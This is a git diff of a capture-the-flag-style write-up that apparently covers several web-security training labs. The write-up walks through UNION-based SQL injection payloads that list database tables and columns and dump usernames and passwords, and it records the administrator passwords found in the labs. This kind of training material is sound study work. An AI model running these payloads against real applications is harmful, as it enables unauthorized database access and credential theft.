@@ -106,25 +106,49 @@ Steps:
 
 - The last step is login to solve this lab.
 
-# SQL injection attack, listing the database contents on non-Oracle databases
+
+# SQL Injection Attack: Listing the Database Contents on Non-Oracle Databases
+
 ## Lab Description
 ![image](Picture/lab6.png)
 
-Kiểm tra database thì thấy nó sử dụng `Postgres`, which holds the table information in the `information_schema.tables`.[The relevant documentation](https://www.postgresql.org/docs/9.1/infoschema-tables.html), we can see available columns are listed. So inject `' UNION SELECT table_name,NULL FROM information_schema.tables--` and I found the table `users_xaurai`.
+Upon checking, the database is using `Postgres`, which stores table information in the `information_schema.tables` view. [The relevant documentation](https://www.postgresql.org/docs/9.1/infoschema-tables.html), we can see the available columns are listed. So, I injected `' UNION SELECT table_name, NULL FROM information_schema.tables--` and found the table `users_xaurai`.
 ```sql
-  SELECT * FROM someTable WHERE category='any' UNION SELECT table_name,NULL FROM information_schema.tables--
+SELECT * FROM someTable WHERE category='any' UNION SELECT table_name, NULL FROM information_schema.tables--
 ```
 
 Steps:
-- `' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name = 'users_xaurai'--`
+- Inject `' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name = 'users_xaurai'--`.
   ```sql
-  SELECT * FROM someTable WHERE category='any' UNION SELECT table_name,NULL FROM information_schema.tables--
+  SELECT * FROM someTable WHERE category='any' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_xaurai'--
   ```
   I found the columns `username_huyzfv` and `password_mxlnvz`.
-- Next step, use `' UNION SELECT username_huyzfv, password_mxlnvz FROM users_xaurai--`.
+- Next, inject `' UNION SELECT username_huyzfv, password_mxlnvz FROM users_xaurai--`.
   ```sql
   SELECT * FROM someTable WHERE category='any' UNION SELECT username_huyzfv, password_mxlnvz FROM users_xaurai--
   ```
-  I found that the password for the `administrator` is `3r5z5qaj2hfhokbicr8a`.
-  
-- The last step is login to solve this lab.
+  I discovered that the password for the `administrator` is `3r5z5qaj2hfhokbicr8a`.
+
+- The last step is to log in using these credentials to solve the lab.
+
+# SQL Injection UNION Attack: Retrieving Data from Other Tables
+
+## Lab Description
+![image](Picture/lab7.png)
+
+We know the database contains another table called `users`, with columns named `username` and `password`. So, I injected `' UNION SELECT username, password FROM users--`.
+
+I found that the password for the `administrator` is `absq994f53k4jwp77utl`.
+
+The last step is to log in to solve this lab.
+
+# SQL Injection UNION Attack: Retrieving Multiple Values in a Single Column
+
+## Lab Description
+![image](Picture/lab8.png)
+
+To retrieve multiple values in a single column, we need to use the `||` operator, which is a string concatenation operator in Oracle. So, I injected `' UNION SELECT null, username || '~' || password FROM users--`.
+
+I found that the password for the `administrator` is `8nx1xp93b0xyx4a2p33f`.
+
+The last step is to log in to solve this lab.
